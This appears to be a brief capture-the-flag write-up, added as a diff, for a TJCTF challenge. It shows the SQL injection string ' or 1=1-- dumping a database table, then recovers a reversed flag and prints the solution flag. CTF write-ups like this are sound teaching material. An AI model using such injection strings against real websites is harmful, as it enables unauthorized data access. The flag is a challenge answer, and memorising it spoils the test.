@@ -1,0 +1,13 @@
+Website is vulnerable to an SQL injection.
+
+SQLi String: ' or 1=1--
+
+Putting this string in dumps the entire table to the webpage.  I first tried searching for 'tjctf{' but found nothing.  So I searched just for '{' and found only a couple of matches, this was one of them.
+
+(12468, u'}re1s4e_t1_3d4m_s1ht{ftcjt', u'TJCTF')
+
+}re1s4e_t1_3d4m_s1ht{ftcjt
+
+reversed...
+
+tjctf{th1s_m4d3_1t_e4s1er}
